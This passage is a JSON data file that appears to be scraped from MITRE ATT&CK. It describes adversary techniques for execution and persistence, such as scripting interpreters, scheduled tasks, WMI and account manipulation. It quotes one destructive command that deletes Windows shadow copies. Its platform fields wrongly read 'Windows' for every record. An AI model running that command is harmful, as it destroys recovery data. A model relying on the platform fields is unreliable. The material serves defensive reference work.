    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:06.485198"
  },
  {
    "technique_id": "T1059.006",
    "name": "Python",
    "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via thepython.exeinterpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.[1]Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:09.882303"
  },
  {
    "technique_id": "T1059.007",
    "name": "JavaScript",
    "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.[1]JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as theComponent Object Modeland Internet Explorer HTML Application (HTA) pages.[2][3][4]JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Appleâ€™s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Appleâ€™s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Appleâ€™s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA andAppleScript. Scripts can be executed via the command line utilityosascript, they can be compiled into applications or script files viaosacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.[5][6][7][8][9]Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of aDrive-by Compromiseor downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part ofObfuscated Files or Information.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:13.250406"
  },
  {
    "technique_id": "T1059.010",
    "name": "AutoHotKey & AutoIT",
    "description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.[1][2]Adversaries may use AHK (.ahk) and AutoIT (.au3) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware asPhishingpayloads.[3]These scripts may also be compiled into self-contained executable payloads (.exe).[1][2]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:16.578590"
  },
  {
    "technique_id": "T1059.011",
    "name": "Lua",
    "description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (.lua), or from Lua-embedded programs (through thestruct lua_State).[1][2]Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.[3][4][5][6]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:19.925774"
  },
  {
    "technique_id": "T1203",
    "name": "Exploitation for Client Execution",
    "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target throughDrive-by CompromiseandSpearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted throughPhishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:23.315250",
    "subtechniques": []
  },
  {
    "technique_id": "T1674",
    "name": "Input Injection",
    "description": "Adversaries may simulate keystrokes on a victimâ€™s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.[1][2]Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.[3]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:26.657572",
    "subtechniques": []
  },
  {
    "technique_id": "T1559",
    "name": "Inter-Process Communication",
    "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as WindowsDynamic Data ExchangeorComponent Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes.[1]Higher level execution mediums, such as those ofCommand and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also useRemote Servicessuch asDistributed Component Object Modelto facilitate remote IPC execution.[2]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:30.030455",
    "subtechniques": [
      {
        "id": "T1559.001",
        "name": "Component Object Model"
      },
      {
        "id": "T1559.002",
        "name": "Dynamic Data Exchange"
      }
    ]
  },
  {
    "technique_id": "T1559.001",
    "name": "Component Object Model",
    "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.[1]Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).[2]Remote COM execution is facilitated byRemote Servicessuch asDistributed Component Object Model(DCOM).[1]Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, andVisual Basic.[2]Specific COM objects also exist to directly perform functions beyond code execution, such as creating aScheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.[1][3]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Inter-Process Communication",
    "parent_technique_id": "T1559",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:33.360384"
  },
  {
    "technique_id": "T1559.002",
    "name": "Dynamic Data Exchange",
    "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded byComponent Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.[1][2][3]Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution viaPhishingcampaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.[4][5][6][7]Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.[8][9]DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to aCommand and Scripting Interpreter. DDE execution can be invoked remotely viaRemote Servicessuch asDistributed Component Object Model(DCOM).[10]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Inter-Process Communication",
    "parent_technique_id": "T1559",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:36.609556"
  },
  {
    "technique_id": "T1106",
    "name": "Native API",
    "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.[1][2]These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar toCommand and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such asNtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.[3][4][5]For example, functions such as the Windows APICreateProcess()or GNUfork()will allow programs and scripts to start other processes.[6][7]This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.[8][9][10]Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.[11][12][13][14]Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.[15]Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions viaDisable or Modify Tools.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:40.078901",
    "subtechniques": []
  },
  {
    "technique_id": "T1053",
    "name": "Scheduled Task/Job",
    "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar toSystem Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:43.409961",
    "subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      }
    ]
  },
  {
    "technique_id": "T1053.002",
    "name": "At",
    "description": "Adversaries may abuse theatutility to perform task scheduling for initial or recurring execution of malicious code. Theatutility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor ofScheduled Task'sschtasksin Windows environments, usingatrequires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running theatcommand, adversaries may also schedule a task withatby directly leveraging theWindows Management InstrumentationWin32_ScheduledJobWMI class.[1]On Linux and macOS,atmay be invoked by the superuser as well as any users added to theat.allowfile. If theat.allowfile does not exist, theat.denyfile is checked. Every username not listed inat.denyis allowed to invokeat. If theat.denyexists and is empty, global use ofatis permitted. If neither file exists (which is often the baseline) only the superuser is allowed to useat.[2]Adversaries may useatto execute programs at system startup or on a scheduled basis forPersistence.atcan also be abused to conduct remoteExecutionas part ofLateral Movementand/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuseatto break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly,atmay also be used forPrivilege Escalationif the binary is allowed to run as superuser viasudo.[3]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:46.768653"
  },
  {
    "technique_id": "T1053.005",
    "name": "Scheduled Task",
    "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. Theschtasksutility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.[1]In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library andWindows Management Instrumentation(WMI) to create a scheduled task. Adversaries may also utilize the Powershell CmdletInvoke-CimMethod, which leverages WMI classPS_ScheduledTaskto create a scheduled task via an XML path.[2]An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar toSystem Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[3]Adversaries may also create \"hidden\" scheduled tasks (i.e.Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task fromschtasks /queryand the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[4][5]Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,Indexvalue) within associated registry keys.[6]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:50.228247"
  },
  {
    "technique_id": "T1129",
    "name": "Shared Modules",
    "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e.,Native API).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides indlfcn.hin functions such asdlopenanddlsym. Although macOS can execute.sofiles, common practice uses.dylibfiles.[1][2][3][4]The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides inNTDLL.dlland is part of the WindowsNative APIwhich is called from functions likeLoadLibraryat run time.[5]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:53.555725",
    "subtechniques": []
  },
  {
    "technique_id": "T1072",
    "name": "Software Deployment Tools",
    "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broadCloud Administration Commandon cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.[1]Such services may also utilizeWeb Protocolsto communicate back to adversary owned infrastructure.[2]Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.[3]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:56.887964",
    "subtechniques": []
  },
  {
    "technique_id": "T1569",
    "name": "System Services",
    "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:00.210018",
    "subtechniques": [
      {
        "id": "T1569.002",
        "name": "Service Execution"
      }
    ]
  },
  {
    "technique_id": "T1569.002",
    "name": "Service Execution",
    "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services.[1]The service control manager is accessible to users via GUI components as well as system utilities such assc.exeandNet.PsExeccan also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.[2]Tools such asPsExecandsc.execan accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction withWindows Serviceduring service persistence or privilege escalation.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Services",
    "parent_technique_id": "T1569",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:03.614895"
  },
  {
    "technique_id": "T1204",
    "name": "User Execution",
    "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms ofPhishing.WhileUser Executionfrequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly afterInternal Spearphishing.Adversaries may also deceive users into performing actions such as:EnablingRemote Access Tools, allowing direct control of the system to the adversaryRunning malicious JavaScript in their browser, allowing adversaries toSteal Web Session Cookies[1][2]Downloading and executing malware forUser ExecutionCoerceing users to copy, paste, and execute malicious code manually[3][4]For example, tech support scams can be facilitated throughPhishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware orRemote Access Tools.[5]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:06.966972",
    "subtechniques": [
      {
        "id": "T1204.001",
        "name": "Malicious Link"
      },
      {
        "id": "T1204.002",
        "name": "Malicious File"
      },
      {
        "id": "T1204.004",
        "name": "Malicious Copy and Paste"
      }
    ]
  },
  {
    "technique_id": "T1204.001",
    "name": "Malicious Link",
    "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior fromSpearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability viaExploitation for Client Execution. Links may also lead users to download files that require execution viaMalicious File.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "User Execution",
    "parent_technique_id": "T1204",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:10.405123"
  },
  {
    "technique_id": "T1204.002",
    "name": "Malicious File",
    "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior fromSpearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.Adversaries may employ various forms ofMasqueradingandObfuscated Files or Informationto increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.[1]WhileMalicious Filefrequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly afterInternal Spearphishing.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "User Execution",
    "parent_technique_id": "T1204",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:13.880186"
  },
  {
    "technique_id": "T1204.004",
    "name": "Malicious Copy and Paste",
    "description": "An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into aCommand and Scripting Interpreter.Malicious websites, such as those used inDrive-by Compromise, may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.[1][2][3][4]Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.[5][6]Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "User Execution",
    "parent_technique_id": "T1204",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:17.220603"
  },
  {
    "technique_id": "T1047",
    "name": "Windows Management Instrumentation",
    "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.[1]WMI is an administration feature that provides a uniform environment to access Windows system components.The WMI service enables both local and remote access, though the latter is facilitated byRemote Servicessuch asDistributed Component Object ModelandWindows Remote Management.[1]Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.[1][2]An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information forDiscoveryas well asExecutionof commands and payloads.[2]For example,wmic.execan be abused by an adversary to delete shadow copies with the commandwmic.exe Shadowcopy Delete(i.e.,Inhibit System Recovery).[3]Note:wmic.exeis deprecated as of January of 2024, with the WMIC feature being \"disabled by default\" on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced byPowerShellas the primary WMI interface.[4]In addition to PowerShell and tools likewbemtool.exe, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.[4]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:20.701505",
    "subtechniques": []
  },
  {
    "technique_id": "T1098",
    "name": "Account Manipulation",
    "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.[1]These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privilegedValid Accounts.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:23.962403",
    "subtechniques": [
      {
        "id": "T1098.002",
        "name": "Additional Email Delegate Permissions"
      },
      {
        "id": "T1098.005",
        "name": "Device Registration"
      },
      {
        "id": "T1098.007",
        "name": "Additional Local or Domain Groups"
      }
    ]
  },
  {
    "technique_id": "T1098.002",
    "name": "Additional Email Delegate Permissions",
    "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.For example, theAdd-MailboxPermissionPowerShellcmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.[1][2][3]In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.[4][5]Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target userâ€™s mail folders.[6]This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can addAdditional Cloud Rolesto the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex:Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.[7]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:27.292022"
  },
  {
    "technique_id": "T1098.005",
    "name": "Device Registration",
    "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a userâ€™s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.[1][2]In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.[3]Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.[4][5][6]Devices registered in Entra ID may be able to conductInternal Spearphishingcampaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.[7]Additionally, an adversary may be able to perform aService Exhaustion Floodon an Entra ID tenant by registering a large number of devices.[8]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:30.650674"
  },
  {
    "technique_id": "T1098.007",
    "name": "Additional Local or Domain Groups",
